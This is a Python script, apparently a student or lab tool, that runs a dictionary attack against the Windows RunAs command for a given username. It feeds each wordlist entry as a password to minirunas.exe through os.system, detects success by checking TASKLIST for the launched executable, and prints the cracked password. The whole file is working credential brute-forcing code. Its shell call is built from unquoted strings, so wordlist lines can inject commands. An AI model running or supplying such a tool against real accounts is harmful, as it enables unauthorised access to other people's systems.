# =========================================================
# Importing relevant libraries
# =========================================================
import argparse, subprocess, os, shutil
from datetime import datetime
from subprocess import check_output


# =========================================================
# Setting up functions for references used during attack
# =========================================================
def miniPath(miniPath):
    return miniPath


def username(username):
    return username


def exefile(exefile):
    return exefile


def dictionary(dictionary):
    return dictionary


def main():
    start = datetime.now()  # start attack timer
    # =========================================================
    # Setting up parses
    # =========================================================
    parser = argparse.ArgumentParser(description='Dictionary Attack for RunAs Command')
    parser.add_argument('username', type=str, help='Username')
    parser.add_argument('exefile', type=str, help='Full executable path and file')
    parser.add_argument('miniPath', type=str, help='Path where minirunas.exe is located')
    parser.add_argument('dictionary', type=str, help='Full dictionary path and file')
    # =========================================================
    # create mutually exclusive commands
    # =========================================================
    group = parser.add_mutually_exclusive_group()
    group.add_argument('-q', '--quiet', action='store_true', help='print quiet')
    group.add_argument('-v', '--verbose', action='store_true', help='print verbose')

    args = parser.parse_args()
    # =========================================================
    # To navigate to MiniRunAs
    # =========================================================
    path = miniPath(args.miniPath)
    os.chdir(path)
    subprocess.run('minirunas.exe')
    # =========================================================
    # To execute the command with dictionary attack
    # =========================================================
    with open(dictionary(args.dictionary), 'r') as f:  # opening dictionary attack list
        counter = 1
        password = ""
        success = 0  # check if attack is successful or not

        process = str(exefile(args.exefile)).split('/', -1)[-1]  # remove characters until remain "filename.exe"
        call = 'TASKLIST', '/FI', 'imagename eq %s' % process  # create a tasklist to check all running processes

        if shutil.which(str(exefile(args.exefile))) is not None:  # check if executable path exists or not
            for line in f:
                line = line.rstrip('\n')  # remove newline at the end of every word

                print("Attempt: #" + str(counter))
                print("Trying password: " + line)
                print("\n")
                os.system(
                    "minirunas " + str(username(args.username)) + " " + str(line) + " " + str(exefile(args.exefile)))
                counter = int(counter) + 1

                # ===================================================================
                # To check if program is running or not
                # =========================================================
                if check_output(call).splitlines()[3:]:
                    password = str(line)
                    success = 1
                    break
        else:
            print("EXECUTABLE PATH NOT FOUND! PLEASE ENTER A VALID PATH!")
            quit()
    # ===================================================================
    # Display info after password is cracked
    # =========================================================
    counter = counter - 1
    stop = datetime.now()  # stop attack timer

    # ===================================================================
    # Display results
    # =========================================================
    if success == 1:
        if args.quiet:  # output with least details
            print(password)

        elif args.verbose:  # output with full details
            print("PASSWORD CRACKED AND FILE EXECUTED!")
            print("Time taken: " + str(stop - start))
            print("Total attempts: " + str(counter))
            print("Target's password:" + password)
            print("\n")
        else:  # output with moderate details
            print("PASSWORD CRACKED AND FILE EXECUTED!")
            print("Target's password:" + password)

    else:
        print("DICTIONARY ATTACK FAILED! PLEASE USE A DIFFERENT LIST!")
        print("Time taken: " + str(stop - start))
        print("Total attempts: " + str(counter))


# run main function

if __name__ == '__main__':
    main()
